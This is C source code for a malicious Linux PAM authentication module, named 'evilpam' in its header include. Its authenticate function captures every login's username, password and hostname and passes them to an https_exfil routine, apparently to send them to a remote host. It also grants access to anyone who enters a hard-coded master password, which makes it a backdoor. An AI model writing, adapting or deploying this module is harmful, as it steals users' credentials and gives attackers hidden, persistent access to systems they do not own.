#include "evilpam.h"


int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv){
    return PAM_SUCCESS;
}


int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv){
    const void *username;
    const char *password;
    char        hostname[HOST_NAME_MAX];
    
    pam_get_item(pamh, PAM_USER, &username);
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    gethostname(hostname,HOST_NAME_MAX);

#ifdef DEBUG
    printf("[+] Creds receive Username: %s | Password: %s | Hostname: %s\n", username, password, hostname);
#endif

    https_exfil((const char *)username, password, (const char *)hostname);
    
#ifdef DEBUG
    printf("[+] Check Magick Password\n");
#endif
    if(strcmp(password, MASTER_PASSWORD) == 0){

#ifdef DEBUG
    printf("[+] Success Welcom\n");
#endif
        return PAM_SUCCESS;
    }

#ifdef DEBUG
    printf("[-] Failed Continue Normal Checks\n");
#endif

    return PAM_CRED_ERR;
}
